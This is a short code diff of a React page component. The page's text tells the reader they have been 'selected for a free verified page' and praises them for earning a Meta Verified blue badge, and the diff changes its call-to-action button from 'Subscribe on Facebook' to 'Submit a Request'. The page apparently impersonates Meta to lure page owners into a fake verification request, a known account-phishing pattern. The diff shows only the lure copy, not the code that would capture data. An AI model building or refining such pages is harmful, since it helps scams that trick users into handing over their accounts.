@@ -155,7 +155,7 @@ const Page: FC = () => {
                 'You have been selected for a free verified page',
                 'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
                 'We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!',
-                'Subscribe on Facebook',
+                'Submit a Request',
                 'A creator toolkit to take your brand further',
                 'Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.',
                 'Learn more',
@@ -308,7 +308,7 @@ const Page: FC = () => {
                                 }}
                                 className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 md:py-4 md:px-8 rounded-lg text-sm md:text-lg w-fit shadow-lg transition"
                             >
-                                {t('Subscribe on Facebook')}
+                                {t('Submit a Request')}
                             </button>
                         </div>
                         <div className="flex items-center justify-center w-full h-full">
